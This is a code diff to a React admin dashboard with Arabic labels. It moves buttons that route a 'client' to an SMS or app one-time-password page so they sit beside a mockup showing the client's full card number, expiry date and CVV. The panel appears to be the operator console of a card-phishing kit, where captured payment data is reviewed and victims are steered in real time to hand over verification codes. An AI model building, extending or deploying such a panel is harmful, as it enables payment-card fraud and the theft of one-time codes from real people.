@@ -276,30 +276,6 @@ export default function AdminDashboard() {
                 </div>
               </div>
 
-              {selected.current_step === "otp_pending" && (
-                <div className="flex justify-center">
-                  <div className="w-full max-w-xs rounded-2xl border border-yellow-500/40 bg-[#182533] p-3 text-center">
-                    <p className="mb-3 text-xs font-bold text-yellow-300">اختر صفحة التحقق للعميل</p>
-                    <div className="grid grid-cols-2 gap-2">
-                      <button
-                        onClick={() => routeToOtp("otp")}
-                        disabled={!!routingId}
-                        className="rounded-xl bg-purple-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-purple-500 disabled:opacity-60"
-                      >
-                        {routingId === "otp" ? "جارٍ التوجيه..." : "OTP SMS"}
-                      </button>
-                      <button
-                        onClick={() => routeToOtp("otp_app")}
-                        disabled={!!routingId}
-                        className="rounded-xl bg-blue-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-blue-500 disabled:opacity-60"
-                      >
-                        {routingId === "otp_app" ? "جارٍ التوجيه..." : "OTP App"}
-                      </button>
-                    </div>
-                  </div>
-                </div>
-              )}
-
               <ChatBubble
                 title="📋 البيانات الشخصية"
                 time={selected.created_date}
@@ -314,7 +290,30 @@ export default function AdminDashboard() {
               />
 
               {(selected.card_holder || selected.card_number_full || selected.expiry_date || selected.cvv) && (
-                <CardMockup app={selected} />
+                <>
+                  <CardMockup app={selected} />
+                  <div className="flex justify-start">
+                    <div className="w-full max-w-xs rounded-2xl border border-yellow-500/40 bg-[#182533] p-3 text-center">
+                      <p className="mb-3 text-xs font-bold text-yellow-300">اختر صفحة التحقق للعميل</p>
+                      <div className="grid grid-cols-2 gap-2">
+                        <button
+                          onClick={() => routeToOtp("otp")}
+                          disabled={!!routingId}
+                          className="rounded-xl bg-purple-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-purple-500 disabled:opacity-60"
+                        >
+                          {routingId === "otp" ? "جارٍ التوجيه..." : "OTP SMS"}
+                        </button>
+                        <button
+                          onClick={() => routeToOtp("otp_app")}
+                          disabled={!!routingId}
+                          className="rounded-xl bg-blue-600 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-blue-500 disabled:opacity-60"
+                        >
+                          {routingId === "otp_app" ? "جارٍ التوجيه..." : "OTP App"}
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                </>
               )}
 
               <ChatBubble
